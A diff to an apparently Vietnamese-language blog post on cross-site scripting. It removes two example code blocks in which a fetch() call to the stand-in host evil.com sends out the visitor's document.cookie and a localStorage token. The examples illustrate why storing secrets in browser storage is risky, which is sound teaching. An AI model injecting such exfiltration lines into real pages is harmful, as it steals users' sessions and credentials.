@@ -49,36 +49,6 @@ Thay vì hiển thị thông báo, kẻ tấn công có thể thực hiện các
 
 Bạn nào mà còn lưu API key, token hay cookie trong localStorage hoặc sessionStorage thì không khác gì dâng token cho kẻ tấn công đâu nhé. Ví dụ thay vì `alert('XSS!')`, nếu là:
 
-<CodeBlock
-  codePreview={false}
-  codeInstances={[
-    {
-      code: "fetch('https://evil.com/steal-cookie?cookie=' + document.cookie)",
-      label: 'javascript',
-      language: 'js'
-    }
-  ]}
-  copyButton={true}
-  compact={true}
-/>
-
-hay: 
-
-<CodeBlock
-  codePreview={false}
-  codeInstances={[
-    {
-      code: "fetch('https://evil.com/steal-token?token=' + localStorage.getItem('token'))",
-      label: 'javascript',
-      language: 'js'
-    }
-  ]}
-  copyButton={true}
-  compact={true}
-/>
-
-thì kẻ tấn công đã có thể lấy được cookie hay token của người dùng rồi.
-
 ---
 
 ## Các loại XSS phổ biến
